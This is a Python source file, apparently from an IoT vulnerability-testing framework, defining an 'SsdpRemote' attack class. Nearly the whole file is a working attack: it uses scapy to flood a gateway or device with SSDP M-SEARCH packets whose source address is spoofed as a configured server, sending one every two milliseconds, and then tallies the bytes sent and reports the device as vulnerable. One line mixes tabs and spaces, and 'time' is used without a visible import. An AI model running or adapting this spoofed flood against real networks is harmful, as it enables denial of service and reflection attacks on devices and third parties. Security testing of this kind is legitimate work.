
from generic_attack import *
import logging
log = logging.getLogger(__name__)
from scapy.all import *
import threading
from arp_spoof import ArpSpoof
import socket
import sys

class SsdpRemote(GenericAttack):

    def __init__(self, attackName, attackConfig, deviceConfig):
        super(SsdpRemote, self).__init__(attackName, attackConfig, deviceConfig)

    def initialize(self, result):
        target = self.config['gateway_ip']
        deviceMac = self.device['macAddress']
        self.running = True
	deviceMode = self.config['deviceMode']
        if deviceMode:
            target=self.device['ip']
        serverIp = self.config['server_ip']
        destAddr = '239.255.255.250'
        destinationPort = self.config[deviceMac]
        packetCount = 0
        while self.running:
            SSDP_ADDR = destAddr
            SSDP_PORT = 1900;
            SSDP_MX = 1
            SSDP_ST = "ssdp:all"

            payload = "M-SEARCH * HTTP/1.1\r\n" + \
                      "HOST: %s:%d\r\n" % (SSDP_ADDR, SSDP_PORT) + \
                      "MAN: \"ssdp:discover\"\r\n" + \
                      "MX: %d\r\n" % (SSDP_MX,) + \
                      "ST: %s\r\n" % (SSDP_ST,) + "\r\n";
            spoofed_packet = IP(src=serverIp, dst=target) / UDP(sport=80, dport=destinationPort) / payload
            send(spoofed_packet)
            time.sleep(0.002)
            packetCount+=1

        payload = "M-SEARCH * HTTP/1.1\r\n" + \
                  "HOST: %s:%d\r\n" % (SSDP_ADDR, SSDP_PORT) + \
                  "MAN: \"ssdp:discover\"\r\n" + \
                  "MX: %d\r\n" % (SSDP_MX,) + \
                  "ST: %s\r\n" % (SSDP_ST,) + "\r\n";
        spoofed_packet = IP(dst=SSDP_ADDR) / UDP(sport=5001, dport=SSDP_PORT) / payload

        dataTransfered = packetCount * len(spoofed_packet)

        result.update({"status": "vulnerable", "dataTransmitted": dataTransfered, "device": deviceMac})
        return

    def shutdown(self):
        self.running = False

